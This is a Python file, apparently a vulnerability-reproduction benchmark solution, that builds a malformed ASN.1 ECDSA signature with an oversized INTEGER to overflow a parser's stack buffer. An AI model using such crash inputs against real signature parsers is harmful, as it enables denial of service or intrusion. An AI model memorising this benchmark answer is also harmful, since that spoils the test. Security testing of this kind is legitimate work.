import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground-truth length is 41798 bytes
        # Create a PoC that triggers stack buffer overflow in ECDSA ASN.1 parsing
        # Structure: minimal valid ASN.1 wrapper with oversized content
        
        # ASN.1 SEQUENCE header for ECDSA signature (r, s)
        # We'll create a valid-looking ASN.1 structure that's too large
        # This exploits the vulnerability by causing buffer overflow during parsing
        
        poc_length = 41798
        
        # Start with valid ASN.1 SEQUENCE header
        # SEQUENCE tag (0x30) + long length form (0x82) + 2-byte length
        header = b'\x30\x82'
        
        # Calculate content length: total - 4 (for tag and length bytes)
        content_length = poc_length - 4
        
        # Add length bytes (big-endian)
        header += struct.pack('>H', content_length)
        
        # Create content that will overflow a stack buffer
        # Include valid-looking INTEGERs with oversized content
        # First INTEGER (r) - very large to cause overflow
        # INTEGER tag (0x02) + long length form (0x82) + 2-byte length
        r_int_header = b'\x02\x82'
        r_length = content_length - 100  # Leave space for second INTEGER
        r_int_header += struct.pack('>H', r_length)
        
        # Fill r with pattern that helps exploitation
        # Using repeating pattern to maximize chances
        r_content = b'A' * r_length
        
        # Second INTEGER (s) - minimal valid INTEGER
        s_int = b'\x02\x01\x01'  # INTEGER of value 1
        
        # Combine everything
        poc = header + r_int_header + r_content + s_int
        
        # Pad to exact length if needed
        if len(poc) < poc_length:
            poc += b'B' * (poc_length - len(poc))
        elif len(poc) > poc_length:
            poc = poc[:poc_length]
        
        return poc